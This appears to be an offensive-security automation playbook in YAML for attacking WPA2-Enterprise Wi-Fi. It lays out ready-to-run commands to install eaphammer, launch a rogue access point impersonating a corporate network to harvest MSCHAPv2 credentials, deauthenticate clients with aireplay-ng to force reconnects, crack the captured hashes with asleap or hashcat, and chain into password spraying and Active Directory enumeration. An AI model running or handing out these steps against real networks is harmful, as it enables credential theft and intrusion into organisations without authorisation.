id: wpa2-enterprise-eaphammer
name: "Wireless — WPA2-Enterprise eaphammer rogue AP → cred harvest"
description: >
  WPA2-Enterprise networks let you set up a rogue AP with the same ESSID;
  client devices auto-associate and try to authenticate, leaking the
  MSCHAPv2 challenge/response (EAP-PEAP, EAP-TTLS). Crack offline.
tags: [wireless, wpa2-enterprise, eap, mschapv2, initial-access]
difficulty: medium

inputs:
  - name: target_essid
    description: "ESSID of the corporate Wi-Fi to impersonate."
    required: true
  - name: wifi_interface
    description: "Your wireless adapter (must support AP/monitor mode, e.g. wlan1)."
    required: true

steps:
  - id: install_eaphammer
    name: "Install eaphammer (one-time)"
    inline_command: |
      git clone https://github.com/s0lst1c3/eaphammer /opt/eaphammer
      cd /opt/eaphammer && sudo ./kali-setup
      ./eaphammer --cert-wizard  # creates a default cert

  - id: scan_for_target
    name: "Confirm target ESSID + signal strength"
    inline_command: "sudo airodump-ng <iface>"
    inputs:
      iface: "${wifi_interface}"

  - id: rogue_ap_attack
    name: "Launch the rogue AP (PEAP/MSCHAPv2 harvest)"
    inline_command: |
      sudo ./eaphammer \
        --auth wpa-eap \
        --essid '<essid>' \
        --interface <iface> \
        --creds
    inputs:
      essid: "${target_essid}"
      iface: "${wifi_interface}"
    notes: |
      Wait for victim devices to associate. Watch stdout for
      "Username: <user>" + "Challenge: ..." + "Response: ..." blocks —
      one per leaked client.
    capture:
      - var: mschapv2_handshake
        regex: 'Username:\s+(\S+)\s+Challenge:\s+([a-f0-9]+)\s+Response:\s+([a-f0-9]+)'
        match: all
        groups: { user: 1, challenge: 2, response: 3 }

  - id: deauth_acceleration
    name: "Force clients to re-associate (deauth)"
    inline_command: |
      # In another shell: deauth the target client(s) to trigger reconnect.
      sudo aireplay-ng --deauth 5 -a <ap_bssid> -c <client_mac> <iface>
    inputs:
      iface: "${wifi_interface}"

  - id: crack_offline
    name: "Crack MSCHAPv2 with asleap / hashcat"
    inline_command: |
      # asleap (fastest for MSCHAPv2):
      asleap -C '<challenge>' -R '<response>' -W /usr/share/wordlists/rockyou.txt
      # Or hashcat mode 5500 (NetNTLMv1, same primitive):
      hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt

references:
  - title: "eaphammer"
    url:   "https://github.com/s0lst1c3/eaphammer"
  - title: "MSCHAPv2 cracking"
    url:   "https://hashcat.net/wiki/doku.php?id=example_hashes"

next_chains:
  - chain: password-spray
    when:   'cracked plaintext'
    reason: 'Corporate Wi-Fi creds usually map to AD users — spray to find Pwn3d!.'
  - chain: ldap-anonymous-enum
    when:   'cracked plaintext + internal network access'
    reason: 'Now you can enumerate AD from inside.'
